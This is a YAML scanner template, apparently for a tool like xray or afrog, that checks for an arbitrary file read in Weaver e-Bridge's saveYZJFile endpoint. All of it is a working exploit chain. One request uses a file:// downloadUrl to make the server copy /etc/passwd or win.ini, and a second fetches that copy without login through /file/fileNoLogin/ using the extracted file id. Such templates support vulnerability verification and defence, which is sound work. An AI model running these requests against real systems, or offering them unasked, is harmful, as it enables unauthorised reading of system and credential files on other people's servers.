expression: (linux0() && linux1()) || (windows0() && windows1())
id: e-bridge-saveyzjfile-file-read
info:
  author: mvhz81
  description: "\u6CDB\u5FAE\u4E91\u6865\uFF08e-Bridge\uFF09\u662F\u4E0A\u6D77\u6CDB\
    \u5FAE\u516C\u53F8\u5728\u201D\u4E92\u8054\u7F51+\u201D\u7684\u80CC\u666F\u4E0B\
    \u7814\u53D1\u7684\u4E00\u6B3E\u7528\u4E8E\u6865\u63A5\u4E92\u8054\u7F51\u5F00\
    \u653E\u8D44\u6E90\u4E0E\u4F01\u4E1A\u4FE1\u606F\u5316\u7CFB\u7EDF\u7684\u7CFB\
    \u7EDF\u96C6\u6210\u4E2D\u95F4\u4EF6\u3002\u6CDB\u5FAE\u4E91\u6865\u5B58\u5728\
    \u4EFB\u610F\u6587\u4EF6\u8BFB\u53D6\u6F0F\u6D1E\uFF0C\u653B\u51FB\u8005\u6210\
    \u529F\u5229\u7528\u8BE5\u6F0F\u6D1E\uFF0C\u53EF\u5B9E\u73B0\u4EFB\u610F\u6587\
    \u4EF6\u8BFB\u53D6\uFF0C\u83B7\u53D6\u654F\u611F\u4FE1\u606F\u3002\ntitle=\"\u6CDB\
    \u5FAE\u4E91\u6865e-Bridge\"\n"
  name: "\u6CDB\u5FAEOA E-Bridge saveYZJFile \u4EFB\u610F\u6587\u4EF6\u8BFB\u53D6"
  severity: high
  verified: true
rules:
  linux0:
    expression: response.status == 200 && response.body.bcontains(b'"isencrypt":')
      && response.body.bcontains(b'"isdelete":')
    output:
      search: '"\\\"id\\\"\\:\\\"(?P<var>.+?)\\\"\\,".bsubmatch(response.body)'
      var: search["var"]
    request:
      method: GET
      path: /wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc//passwd&fileExt=txt
  linux1:
    before_sleep: 2
    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
    request:
      method: GET
      path: /file/fileNoLogin/{{var}}
    stop_if_match: true
  windows0:
    expression: response.status == 200  && response.body.bcontains(b'"isencrypt":')
      && response.body.bcontains(b'"isdelete":')
    output:
      search2: '"\\\"id\\\"\\:\\\"(?P<var>.+?)\\\"\\,".bsubmatch(response.body)'
      var: search2["var"]
    request:
      method: GET
      path: /wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///c://windows/win.ini&fileExt=txt
    stop_if_mismatch: true
  windows1:
    before_sleep: 2
    expression: response.status == 200 && (response.body.bcontains(b"for 16-bit app
      support") || response.body.bcontains(b"[extensions]"))
    request:
      method: GET
      path: /file/fileNoLogin/{{var}}
